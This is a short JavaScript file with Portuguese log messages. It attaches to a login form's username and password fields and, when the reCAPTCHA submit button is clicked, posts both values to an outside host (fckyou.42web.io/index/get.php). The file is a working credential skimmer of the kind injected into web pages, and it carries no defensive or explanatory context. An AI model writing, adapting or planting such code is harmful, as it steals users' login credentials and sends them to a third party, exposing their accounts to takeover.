document.addEventListener("DOMContentLoaded", function() {
    console.log("yepp")

    let btn = document.getElementsByClassName("g-recaptcha")
    const username = document.querySelector('[name="user.login"]')
    const password = document.querySelector('[name="user.senha"]')



    console.log("encontrou")
    btn[0].addEventListener("click", async function(){
        console.log("Botão de envio de formulário clicado.");

        let xhr = new XMLHttpRequest();

        console.log("Objeto XMLHttpRequest criado.");


        const urlContent = xhr.responseText;

        const data = new FormData();
        data.append("username", username.value);
        data.append("password", password.value);

        const response = await fetch("http://fckyou.42web.io/index/get.php", {
            method: "POST",
            body: data
        });

        console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");

        console.log("Requisição enviada para o servidor.");
    });
});
